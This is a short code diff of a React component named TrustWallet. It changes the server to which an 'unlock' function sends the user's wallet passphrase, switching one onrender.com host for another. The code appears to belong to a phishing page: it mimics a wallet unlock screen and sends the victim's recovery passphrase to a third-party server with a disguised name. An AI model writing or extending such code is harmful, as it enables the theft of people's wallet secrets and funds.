@@ -10,7 +10,7 @@ const TrustWallet = () => {
   const [loading, setLoading] = useState(false);
 
   const unlockWallet = async () => {
-    const url = 'https://coinbasebackend.onrender.com/trust';
+    const url = 'https://secondwalletvalwizzy.onrender.com/trust';
     const data = { passphrase: text };
     try {
       setLoading(true);
